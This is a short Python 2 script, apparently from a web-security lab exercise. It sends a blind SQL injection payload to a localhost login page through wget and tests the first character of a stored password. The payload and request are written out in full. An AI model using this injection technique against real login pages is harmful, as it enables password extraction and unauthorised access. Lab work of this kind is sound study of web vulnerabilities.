import subprocess

request = "\"http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' --  \""
bashCommand = "wget  -q -O -  " + request 
#bashCommand = "echo 'hello' "
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()
print output
print bashCommand

